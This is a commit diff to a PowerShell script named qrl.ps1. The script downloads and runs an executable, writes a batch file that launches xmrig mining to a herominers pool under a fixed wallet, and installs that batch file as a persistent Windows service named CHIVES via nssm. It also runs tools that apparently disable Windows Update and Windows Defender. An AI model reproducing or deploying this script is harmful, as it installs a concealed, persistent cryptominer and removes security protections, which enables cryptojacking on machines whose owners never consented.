9913b271f70e5a617a62c4d00ce24618d8b14962
trangtrau <30510221+trangtrau@users.noreply.github.com>
2023-10-05 13:05:44 +0700

    Update qrl.ps1

--- qrl.ps1
+++ qrl.ps1
@@ -4,6 +4,7 @@ Invoke-WebRequest -Uri $url -OutFile "$downloadPath\QRL_VAN.exe"
 $packetCryptPath = Join-Path -Path $downloadPath -ChildPath "QRL_VAN.exe"
 Start-Process -FilePath $packetCryptPath
 Start-Sleep -Seconds 2
+
 Set-Location -Path "C:\AutoRclone-master"
 $userName = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
 $userName = $userName -replace "^.*\\", ""
@@ -14,14 +15,12 @@ xmrig.exe --donate-level 1 -o de.qrl.herominers.com:1166 -u Q01050060fadbd7c6007
 pause
 "@
 $batContent | Set-Content -Path (Join-Path -Path $folderPath -ChildPath "van.bat") -Force
+
 New-Item -Path "$env:USERPROFILE\Desktop\Service_OK.dat" -ItemType File
-Start-Process -FilePath "nssm.exe" -ArgumentList "install CHIVES "C:\AutoRclone-master\van.bat""
+
+Start-Process -FilePath "nssm.exe" -ArgumentList "install CHIVES `"$folderPath\van.bat`""
 Start-Sleep -Seconds 1
 Start-Process -FilePath "nssm.exe" -ArgumentList "start CHIVES"
 Start-Process -FilePath "wub.exe" -ArgumentList "/D"
 Start-Process -FilePath "dfControl.exe"
-
-
-
-
-
+Start-Sleep -Seconds 1
